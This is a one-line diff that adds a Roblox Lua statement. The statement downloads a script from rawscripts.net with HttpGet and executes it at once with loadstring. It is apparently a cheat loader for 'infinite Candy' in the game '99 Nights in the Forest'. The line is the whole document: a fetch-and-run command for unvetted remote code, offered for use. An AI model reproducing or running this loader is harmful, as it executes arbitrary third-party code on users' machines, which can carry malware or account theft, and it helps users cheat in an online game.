@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-infinite-Candy-63867"))()
